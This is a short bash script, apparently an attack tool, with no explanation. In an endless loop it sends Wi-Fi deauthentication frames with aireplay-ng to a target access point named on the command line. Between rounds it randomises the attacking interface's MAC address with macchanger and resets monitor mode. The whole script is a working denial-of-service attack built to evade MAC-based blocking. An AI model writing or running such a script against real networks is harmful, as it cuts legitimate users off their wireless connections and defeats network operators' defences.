#!/bin/bash

while true
do
	aireplay-ng -0 5 -a $1 $2
	
	ifconfig $2 down
	macchanger -r $2 | grep "New MAC"

	iwconfig $2 mode monitor
	ifconfig $2 up
	iwconfig $2 | grep mode
	sleep 3

	echo Waiting...
done
